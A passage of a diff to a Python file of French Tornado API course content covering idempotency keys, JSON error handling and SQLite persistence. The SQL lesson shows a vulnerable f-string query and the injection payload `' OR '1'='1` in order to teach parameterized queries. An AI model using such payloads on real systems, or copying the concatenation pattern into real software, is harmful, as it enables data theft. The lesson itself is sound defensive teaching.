-                    "1. Une application mobile envoie `POST /api/v1/paiements` (`{\"montant\": 25000}`).\n"
-                    "2. Le serveur Tornado reçoit la requête, débite les 25 000 DZD et renvoie `201 Created`.\n"
-                    "3. Mais au moment où la réponse traverse le tunnel 4G du téléphone, la connexion coupe ! L'application "
-                    "mobile reçoit une erreur `Network Timeout`.\n"
-                    "4. L'application mobile ne sait pas si le serveur a reçu la requête ou non : elle renvoie donc le même "
-                    "`POST /api/v1/paiements` par sécurité. Sans protection, le client est débité **deux fois (50 000 DZD)** !"
+                    "En informatique distribuée, l'impossibilité de distinguer à coup sûr une requête perdue à l'aller d'une "
+                    "réponse perdue au retour est connue sous le nom de *problème des deux généraux*. Suivons chronologiquement "
+                    "ce qui se passe lorsqu'un téléphone mobile envoie `POST /api/v1/paiements` (`{\"montant\": 25000}`) dans "
+                    "un ascenseur ou un tunnel routier : le paquet TCP parvient bien au démon Tornado, la transaction SQL "
+                    "débite les 25 000 DZD avec `conn.commit()`, et Tornado pousse `HTTP/1.1 201 Created` dans son tampon "
+                    "d'écriture. Mais à cet instant précis, la couverture 4G s'évanouit pendant quatre secondes.\n\n"
+                    "N'ayant jamais reçu l'octet de confirmation `201`, le SDK mobile lève une `TimeoutError`. S'il réémet "
+                    "automatiquement le même `POST /api/v1/paiements` dès le retour du réseau sans mécanisme d'idempotence, "
+                    "Tornado traite cette trame comme une intention neuve et débite une **seconde fois** les 25 000 DZD !"
                 )
             },
             {
-                "heading": "3. La solution industrielle : l'en-tête `Idempotency-Key` (Standard IETF / Stripe)",
+                "heading": "3. Implémentation d'un Cache Atomique `Idempotency-Key` dans Tornado",
                 "body": (
-                    "Pour rendre `POST` idempotent sans jamais créer de doublon :\n"
-                    "1. Avant d'envoyer sa requête `POST`, le client génère un identifiant unique (`UUID v4`, ex: `Idempotency-Key: tx-99812-a4b2`).\n"
-                    "2. Lors du 1er appel, le `RequestHandler` vérifie `self.request.headers.get('Idempotency-Key')` dans son cache d'idempotence. Comme "
-                    "elle est nouvelle, il exécute le paiement et **mémorise le résultat exact associé à cette clé**.\n"
-                    "3. Si le client renvoie la même requête avec la même `Idempotency-Key: tx-99812-a4b2`, le serveur reconnaît "
-                    "la clé, **n'exécute PAS une seconde fois le paiement**, et renvoie immédiatement la réponse initiale mise en cache !"
+                    "Pour conférer artificiellement l'idempotence à une opération `POST` critique, l'industrie applique le "
+                    "protocole **`Idempotency-Key`** (spécification IETF *Idempotency-Key HTTP Header Field*). **Avant sa "
+                    "toute première tentative**, c'est impérativement le **client** qui génère un identifiant aléatoire "
+                    "universellement unique (`UUID v4`, ex. `Idempotency-Key: idem-8f9c2a10-4b1e`) attaché à l'action "
+                    "métier, et il conserve cette même clé pour tous ses réessais éventuels.\n\n"
+                    "```python — Déduplication par Idempotency-Key avec empreinte du payload (SHA-256)\n"
+                    "cle_idem = self.request.headers.get(\"Idempotency-Key\", \"\").strip()\n"
+                    "empreinte_corps = hashlib.sha256(self.request.body).hexdigest()\n"
+                    "if cle_idem and cle_idem in CACHE_IDEMPOTENCE:\n"
+                    "    entree = CACHE_IDEMPOTENCE[cle_idem]\n"
+                    "    if entree[\"hash\"] != empreinte_corps:\n"
+                    "        self.set_status(422)  # Même clé réutilisée avec un montant différent !\n"
+                    "        self.finish({\"erreur\": \"Conflit de payload sur cette Idempotency-Key\"})\n"
+                    "        return\n"
+                    "    self.set_header(\"X-Idempotent-Replay\", \"true\")\n"
+                    "    self.set_status(entree[\"status\"])\n"
+                    "    self.finish(entree[\"body\"])\n"
+                    "    return\n"
+                    "```\n\n"
+                    "> [!TIP] Déploiement multi-processus derrière Nginx\n"
+                    "> En production sur un cluster de 4 instances Tornado (`:8001..8004`), un réessai client peut atterrir "
+                    "sur le nœud `:8003` alors que l'essai initial avait frappé `:8001`. Le registre `CACHE_IDEMPOTENCE` "
+                    "doit donc résider dans un magasin partagé atomique tel que **Redis** (`SET key val NX EX 86400`) ou une "
+                    "contrainte `UNIQUE` en base SQL."
                 )
             }
         ],
@@ -685,8 +867,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le script dans l'atelier ci-dessus pour observer comment les deux appels `POST` portant la même `Idempotency-Key` produisent une seule transaction.",
-            "Dans l'onglet **curl & Postman**, testez la commande `2.4 — PATCH` pour modifier uniquement la salle de la formation `#1`."
+            "Exécutez `day_3/03_put_patch_et_idempotence.py` dans l'atelier ci-dessus pour constater que deux requêtes `POST` successives munies de la même `Idempotency-Key` ne génèrent qu'une unique entité en mémoire.",
+            "Rendez-vous dans l'onglet **curl & Postman** et exécutez la commande `2.4 — PATCH` pour modifier uniquement l'attribut `salle` de la formation `#1`."
         ]
     },
 
@@ -695,44 +877,77 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d3-l3": {
         "context": (
-            "Par défaut, lorsqu'un client appelle une URL qui n'existe pas (`/api/introuvable`), utilise une méthode HTTP non implémentée "
-            "(`DELETE /api/catalogue`) ou déclenche une exception non gérée, Tornado renvoie **une page Web HTML** "
-            "(`<html><title>404: Not Found</title><body>404: Not Found</body></html>`) !\n"
-            "Or, le programme client qui consomme votre API s'attend à recevoir du JSON et exécute `response.json()` : "
-            "en recevant le caractère `<` de `<html>`, le client plante avec une erreur fatale "
-            "`SyntaxError: Unexpected token '<'` ! Ce chapitre montre comment surcharger `write_error` et `default_handler_class` "
-            "pour garantir un contrat **100 % JSON en toutes circonstances**."
+            "Que renvoie par défaut un serveur Tornado fraîchement installé lorsqu'un client interroge une URL "
+            "inconnue (`/api/v1/introuvable`), invoque un verbe non implémenté (`DELETE /api/v1/catalogue`) ou "
+            "déclenche une division par zéro imprévue au milieu d'un calcul ? Il émet une **page Web HTML** "
+            "`<html><title>404: Not Found</title><body>404: Not Found</body></html>` !\n\n"
+            "Pour une application mobile ou un microservice partenaire qui exécute systématiquement `await response.json()`, "
+            "recevoir le chevron ouvrant `<` de `<html>` provoque un crash côté client (`SyntaxError: Unexpected token '<'`), "
+            "masquant le véritable code HTTP d'origine. Ce chapitre montre comment verrouiller un **contrat 100 % JSON "
+            "en toutes circonstances** grâce au tandem **`write_error()`** et **`default_handler_class`**."
         ),
         "deep_sections": [
             {
-                "heading": "1. Intercepter toutes les erreurs HTTP dans `BaseJSONHandler.write_error(self, status_code, **kwargs)`",
+                "heading": "1. Le Pipeline d'Exception de Tornado : `send_error()` et `write_error(status_code, **kwargs)`",
                 "body": (
-                    "Dans Tornado, chaque fois qu'une erreur HTTP survient (que ce soit un verbe non supporté `405 Method Not Allowed`, "
-                    "un appel à `self.send_error(400)` ou une exception Python imprévue `500`), Tornado appelle la méthode "
-                    "**`write_error(self, status_code: int, **kwargs)`** du `RequestHandler`.\n"
-                    "En surchargeant `write_error` dans votre classe de base `BaseJSONHandler`, vous remplacez la page HTML par défaut "
-                    "par un dictionnaire JSON RFC 7807 (`application/problem+json`) contenant `status`, `title`, `detail` et `instance` (`self.request.path`)."
+                    "Dans le code source interne de `tornado.web.RequestHandler`, toute anomalie levée pendant `prepare()` ou "
+                    "pendant la méthode HTTP (`get`, `post`, `put`, `delete`) est capturée par `_handle_request_exception(e)`. "
+                    "Si l'exception est une instance de `tornado.web.HTTPError(status_code, reason=...)`, Tornado extrait son "
+                    "code HTTP ; s'il s'agit d'une exception Python quelconque non gérée (`ZeroDivisionError`, `KeyError`, "
+                    "`RuntimeError`), il la journalise sur `tornado.application` et fixe le code à `500`. Dans les deux cas, "
+                    "Tornado appelle `self.send_error(status_code, exc_info=sys.exc_info())`, qui **vide d'abord tout tampon "
+                    "partiel via `self.clear()`**, positionne le statut, puis délègue le formatage final du corps à "
+                    "**`self.write_error(status_code, **kwargs)`**.\n\n"
+                    "```python — Surcharge industrielle RFC 7807 de write_error dans BaseJSONHandler\n"
+                    "class BaseJSONHandler(tornado.web.RequestHandler):\n"
+                    "    def write_error(self, status_code: int, **kwargs) -> None:\n"
+                    "        self.set_header(\"Content-Type\", \"application/problem+json; charset=UTF-8\")\n"
+                    "        detail = self._reason  # Message officiel HTTP ou reason passé à HTTPError\n"
+                    "        if status_code >= 500:\n"
+                    "            detail = \"Une erreur interne est survenue. Communiquez le request_id au support.\"\n"
+                    "        self.finish({\n"
+                    "            \"type\": f\"https://httpstatuses.com/{status_code}\",\n"
+                    "            \"title\": self._reason,\n"
+                    "            \"status\": status_code,\n"
+                    "            \"detail\": detail,\n"
+                    "            \"instance\": self.request.path,\n"
+                    "            \"request_id\": getattr(self, \"request_id\", None),\n"
+                    "        })\n"
+                    "```\n\n"
+                    "> [!NOTE] Pourquoi `self.clear()` réappelle `set_default_headers()`\n"
+                    "> Lorsque `send_error()` exécute `self.clear()` pour purger d'éventuels octets déjà écrits avant le "
+                    "crash, Tornado réinvoque immédiatement `self.set_default_headers()`. C'est la raison pour laquelle vos "
+                    "en-têtes CORS posés dans `set_default_headers()` restent présents même sur une erreur `500`, permettant "
+                    "au frontal React de lire proprement le JSON d'erreur !"
                 )
             },
             {
-                "heading": "2. Intercepter les URLs inconnues (`404`) avec `default_handler_class`",
+                "heading": "2. Capturer les Routes Inconnues (`404`) avec `default_handler_class` sur `Application`",
                 "body": (
-                    "Lorsqu'une requête ne correspond à aucune expression régulière de `tornado.web.Application`, aucun de vos handlers "
-                    "métier n'est trouvé.\n"
-                    "En passant **`default_handler_class=NotFoundJSONHandler`** (une sous-classe de `BaseJSONHandler` dont `prepare(self)` "
-                    "appelle `raise tornado.web.HTTPError(404)`) aux paramètres de `tornado.web.Application`, même les URLs totalement "
-                    "inconnues passent par `write_error(404)` et retournent un JSON propre !"
+                    "Un piège subtil guette les développeurs Tornado : redéfinir `write_error()` sur `BaseJSONHandler` "
+                    "convertit bien en JSON les erreurs `400`, `405` et `500` survenant sur vos routes déclarées, ainsi que "
+                    "les `raise tornado.web.HTTPError(404)` levés manuellement lorsque l'ID `#999` manque en base. Mais que "
+                    "se passe-t-il lorsqu'un client appelle `/api/v1/route-inexistante` qui ne correspond à **aucune "
+                    "expression régulière** de votre table de routage ?\n\n"
+                    "Par défaut, `tornado.web.Application` instancie alors sa classe interne `tornado.web.ErrorHandler(status_code=404)` "
+                    "qui n'hérite pas de votre `BaseJSONHandler` et renvoie encore du HTML ! Pour fermer définitivement cette "
+                    "brèche, on déclare une sous-classe `NotFoundJSONHandler(BaseJSONHandler)` dont `prepare(self)` lève "
+                    "`raise tornado.web.HTTPError(404, reason=\"Route introuvable\")`, et on l'enregistre via "
+                    "**`tornado.web.Application(routes, default_handler_class=NotFoundJSONHandler)`**."
                 )
             },
             {
-                "heading": "3. Masquage des erreurs `500` (`exc_info`) et Corrélation (`X-Request-ID`)",
+                "heading": "3. Cloisonnement de `exc_info` et Désactivation Impérative de `debug=True` en Production",
                 "body": (
-                    "Que se passe-t-il si un bug imprévu (une division par zéro ou une base SQL momentanément verrouillée) "
-                    "survient au milieu d'une méthode `get(self)` en production ?\n"
-                    "Tornado capture l'exception et appelle `write_error(500, exc_info=sys.exc_info())` :\n"
-                    "1. Vous enregistrez la trace complète du bug dans les journaux internes du serveur avec `self.request_id`.\n"
-                    "2. Vous renvoyez au client un JSON propre **`500 Internal Server Error`** qui ne divulgue **aucun secret "
-                    "ni chemin de fichier interne**."
+                    "Lorsqu'une exception `500` imprévue survient, Tornado transmet le triplet `(type, value, traceback)` dans "
+                    "`kwargs[\"exc_info\"]` à `write_error()`. Pendant le développement local, activer `debug=True` (ou "
+                    "`serve_traceback=True`) affiche la pile d'appels pour accélérer le diagnostic. En production exposée sur "
+                    "Internet, divulguer un *Traceback* Python constitue une **fuite d'information critique (OWASP Security "
+                    "Misconfiguration)** révélant les versions exactes de vos bibliothèques, les chemins système `/home/...` "
+                    "et la structure de vos requêtes SQL.\n\n"
+                    "En production (`debug=False`), `write_error()` journalise l'intégralité de `exc_info` en interne avec "
+                    "`self.request_id`, mais ne retourne jamais au client qu'un message générique neutre accompagné de cet "
+                    "identifiant de corrélation."
                 )
             }
         ],
@@ -768,8 +983,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le script dans l'atelier ci-dessus pour vérifier que les erreurs `404`, `405` et `500` renvoient toutes `Content-Type: application/problem+json`.",
-            "Testez `GET /api/sandbox/formations/999` dans le Client HTTP pour observer une réponse `404` en JSON."
+            "Exécutez `day_3/04_gestion_erreurs_globale.py` dans l'atelier ci-dessus pour vérifier que les scénarios `404`, `405` et `500` (`ZeroDivisionError`) restituent tous un corps JSON propre exempt de balises HTML.",
+            "Interrogez `GET /api/sandbox/formations/999` depuis le Client HTTP et inspectez l'enveloppe JSON d'erreur retournée par Tornado."
         ]
     },
 
@@ -778,52 +993,78 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d3-l4": {
         "context": (
-            "Stocker les données dans une liste Python `FORMATIONS = [...]` présente une limite rédhibitoire : la "
-            "liste réside en mémoire vive (RAM). Dès que vous redémarrez le serveur Tornado ou qu'une coupure électrique "
-            "survient, toutes les formations créées par vos utilisateurs disparaissent !\n"
-            "Pour conserver les données de manière durable sur disque dur tout en garantissant l'intégrité des écritures "
-            "concurrentes, toute API s'appuie sur un **Système de Gestion de Base de Données Relationnelle (SGBDR)** "
-            "interrogé en langage **SQL**. Python intègre nativement le moteur transactionnel **SQLite (`sqlite3`)**, "
-            "idéal pour apprendre les patrons d'accès aux bases de données et la prévention des **Injections SQL**."
+            "Maintenir un catalogue dans une liste Python `FORMATIONS = [...]` souffre d'un vice rédhibitoire : la "
+            "structure réside en mémoire vive volatile et demeure isolée à l'intérieur d'un seul processus. Au moindre "
+            "redémarrage du démon Tornado ou déploiement multi-instances derrière Nginx, l'état s'évapore ou diverge "
+            "entre les nœuds.\n\n"
+            "La persistance durable et cohérente d'une API s'appuie sur un **Système de Gestion de Base de Données "
+            "Relationnelle (SGBDR)** conforme aux garanties **ACID**. À travers le moteur C embarqué **`sqlite3`** de "
+            "la bibliothèque standard Python, ce chapitre maîtrise le cycle transactionnel, l'éradication mathématique "
+            "des **Injections SQL** par requêtes préparées (`?`), et la délégation non bloquante vers un pool de threads "
+            "via **`IOLoop.current().run_in_executor()`**."
         ),
         "deep_sections": [
             {
-                "heading": "1. Le cycle d'une Transaction SQL (`connect` → `execute` → `commit` / `rollback` → `close`)",
+                "heading": "1. Transactions ACID, Journalisation `WAL` et Fabrique `sqlite3.Row`",
                 "body": (
-                    "Une base de données relationnelle garantit les propriétés **ACID** (*Atomicité, Cohérence, Isolation, Durabilité*) :\n"
-                    "- **Atomicité (`commit` vs `rollback`)** : Imaginez un virement bancaire composé de deux requêtes SQL "
-                    "(débiter le compte A, puis créditer le compte B). Si une erreur survient entre les deux, `conn.rollback()` "
-                    "annule tout comme si rien ne s'était passé ! Les modifications ne deviennent permanentes sur le disque "
-                    "qu'au moment précis de l'appel à **`conn.commit()`**.\n"
-                    "- **`conn.row_factory = sqlite3.Row`** : Par défaut, `sqlite3` renvoie chaque ligne sous forme de tuple "
-                    "anonyme `(1, 'API Tornado', 5)`. En activant `sqlite3.Row`, chaque ligne se comporte comme un dictionnaire "
-                    "convertible instantanément par `dict(row)` -> `{\"id\": 1, \"titre\": \"API Tornado\", \"duree_jours\": 5}` !"
+                    "Un moteur relationnel conforme au modèle **ACID** garantit quatre invariants matériels : l'**Atomicité** "
+                    "(une transaction comprenant plusieurs écritures réussit intégralement au `conn.commit()` ou est annulée "
+                    "intégralement au `conn.rollback()` sans jamais laisser d'état intermédiaire corrompu), la **Cohérence** "
+                    "(respect strict des contraintes `NOT NULL`, `UNIQUE`, `CHECK` et `FOREIGN KEY`), l'**Isolation** entre "
+                    "transactions concurrentes, et la **Durabilité** sur support non volatil après synchronisation disque.\n\n"
+                    "#### Optimiser SQLite pour un serveur Web avec `WAL` et `sqlite3.Row`\n\n"
+                    "Sur une API Tornado, deux réglages transforment l'ergonomie et les performances de SQLite : activer le "
+                    "mode **`PRAGMA journal_mode=WAL;`** (*Write-Ahead Logging*) autorise les lecteurs `SELECT` à s'exécuter "
+                    "en parallèle d'une écriture `INSERT`/`UPDATE` sans verrouiller le fichier (`database is locked`), tandis "
+                    "que configurer **`conn.row_factory = sqlite3.Row`** substitue aux tuples anonymes `(1, 'Tornado', 5)` des "
+                    "enregistrements indexés par nom de colonne immédiatement convertibles en dictionnaire JSON via `dict(row)`."
                 )
             },
             {
-                "heading": "2. Anatomie d'une Attaque par Injection SQL (SQLi) et pourquoi `?` la rend impossible",
+                "heading": "2. Anatomie d'une Injection SQL sur l'AST et Inviolabilité des Requêtes Préparées (`?`)",
                 "body": (
-                    "L'**Injection SQL** est l'une des vulnérabilités les plus destructrices de l'histoire de l'informatique :\n"
-                    "- **Code vulnérable (Concaténation `f\"...\"`)** :\n"
-                    "  `conn.execute(f\"SELECT * FROM formations WHERE salle = '{salle}'\")`\n"
-                    "  Si un attaquant envoie `salle = \"' OR '1'='1\"`, la requête SQL exécutée devient :\n"
-                    "  `SELECT * FROM formations WHERE salle = '' OR '1'='1'` !\n"
-                    "  Comme `'1'='1'` est toujours vrai, la base de données renvoie **100 % de la table** (ou exécute `DROP TABLE` si `executescript` est utilisé) !\n"
-                    "- **Code inviolable (Requête Paramétrée avec `?`)** :\n"
-                    "  `conn.execute(\"SELECT * FROM formations WHERE salle = ?\", (salle,))`\n"
-                    "  Ici, le moteur SQLite compile d'abord la structure de la commande SQL avec le marqueur `?`, puis "
-                    "insère la valeur de `salle` **exclusivement comme une donnée littérale inoffensive**, sans jamais "
-                    "l'interpréter comme une instruction SQL."
+                    "Pourquoi la concaténation `f\"SELECT * FROM formations WHERE salle = '{salle}'\"` constitue-t-elle une "
+                    "vulnérabilité critique classée au sommet de l'OWASP ? Parce qu'elle mélange dans le **même canal textuel** "
+                    "le code exécutable SQL et la donnée non fiable fournie par l'utilisateur. Si un attaquant transmet "
+                    "`salle = \"' OR '1'='1\"`, l'analyseur lexical de SQLite découvre une apostrophe fermante prématurée "
+                    "suivie de l'opérateur logique `OR` : l'arbre syntaxique abstrait (*AST*) de la requête est réécrit et la "
+                    "condition devient universellement vraie, exfiltrant 100 % des lignes de la table !\n\n"
+                    "```python — Séparation physique Compilation AST / Liaison Binaire en DB-API 2.0\n"
+                    "# 1. Le moteur C compile sqlite3_prepare_v2() sur un squelette SQL immuable :\n"
+                    "cur = conn.execute(\n"
+                    "    \"SELECT id, titre, duree_jours, salle FROM formations WHERE salle = ?\",\n"
+                    "    (salle,)  # Notez la virgule obligatoire du tuple à 1 élément !\n"
+                    ")\n"
+                    "# 2. sqlite3_bind_text() injecte la valeur dans le slot #1 APRES compilation de l'AST.\n"
+                    "```\n\n"
+                    "Avec le marqueur positionnel `?` (ou nommé `:salle`), l'arbre syntaxique de l'ordre SQL est compilé et "
+                    "scellé **avant même que SQLite n'examine les octets de `salle`**. L'entrée `\"' OR '1'='1\"` est "
+                    "simplement comparée caractère pour caractère au nom d'une salle littérale, retournant `0` ligne : "
+                    "l'injection SQL devient mathématiquement impossible."
                 )
             },
             {
-                "heading": "3. Gestion des contraintes d'intégrité (`sqlite3.IntegrityError`) et code HTTP `409 Conflict`",
+                "heading": "3. Contraintes `IntegrityError` (`409`) et Délégation Non Bloquante `run_in_executor` sur l'`IOLoop`",
                 "body": (
-                    "Dans un schéma SQL professionnel, on définit des contraintes strictes sur les colonnes : `NOT NULL`, "
-                    "`UNIQUE` (ex: le code officiel d'une formation ou l'adresse e-mail d'un étudiant) et `CHECK (duree_jours > 0)`.\n"
-                    "- Si un client tente d'insérer une seconde formation avec un code déjà existant, SQLite lève `sqlite3.IntegrityError`.\n"
-                    "- Plutôt que de laisser cette exception provoquer une erreur `500`, le `RequestHandler` intercepte `except sqlite3.IntegrityError:` "
-                    "et renvoie un code sémantique **`409 Conflict`** expliquant clairement quel champ unique est en doublon."
+                    "Lorsqu'une insertion viole une contrainte `UNIQUE` (doublon de matricule ou d'e-mail), SQLite lève "
+                    "`sqlite3.IntegrityError`. Un `RequestHandler` soigné intercepte explicitement cette exception pour "
+                    "émettre `conn.rollback()` et restituer un code métier **`409 Conflict`** au lieu d'une erreur `500`.\n\n"
+                    "#### Préserver la fluidité de l'`IOLoop` face aux entrées-sorties disque synchrones\n\n"
+                    "En architecture Tornado avancée, une question cruciale se pose : le module standard `sqlite3` (tout comme "
+                    "`psycopg2` ou un calcul intensif) effectue des appels système disque **bloquants**. Si une requête SQL "
+                    "complexe dure 25 millisecondes sur disque, l'exécuter directement dans `def get(self)` bloque l'`IOLoop` "
+                    "pendant 25 ms. Comment exécuter du SQL synchrone sans jamais figer la boucle d'événements ? Tornado "
+                    "fournit la passerelle native **`await tornado.ioloop.IOLoop.current().run_in_executor(None, fonction_sql, *args)`**, "
+                    "qui déporte l'opération bloquante vers le `ThreadPoolExecutor` d'arrière-plan tout en laissant l'`IOLoop` "
+                    "libre de servir des milliers d'autres sockets !\n\n"
+                    "```python — Déporter une transaction SQLite synchrone hors du thread de l'IOLoop\n"
+                    "class FormationsAsyncSqlHandler(tornado.web.RequestHandler):\n"
+                    "    async def get(self) -> None:\n"
+                    "        loop = tornado.ioloop.IOLoop.current()\n"
+                    "        # Exécute lire_formations_sqlite() dans un thread worker sans bloquer epoll :\n"
+                    "        lignes = await loop.run_in_executor(None, lire_formations_sqlite)\n"
+                    "        self.write({\"total\": len(lignes), \"data\": lignes})\n"
+                    "```"
                 )
             }
         ],
@@ -861,8 +1102,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez la démonstration d'Injection SQL dans l'atelier ci-dessus et comparez le nombre de lignes renvoyées entre la requête vulnérable et la requête paramétrée.",
-            "Testez le cycle complet `POST` -> `PUT` -> `GET` sur `/api/sandbox/formations` dans l'onglet **Client HTTP & Inspecteur**."
+            "Ouvrez l'onglet **SQLite & Requêtes Préparées** du laboratoire pour éprouver en direct la charge d'injection `\"Salle A' OR '1'='1\"` face à une concaténation vulnérable puis face au marqueur préparé `?`.",
+            "Enchaînez le cycle transactionnel complet `POST` -> `PUT` -> `GET` sur `/api/sandbox/formations` depuis le **Client HTTP** et vérifiez la persistance effective en base SQLite."
         ]
     }
 }
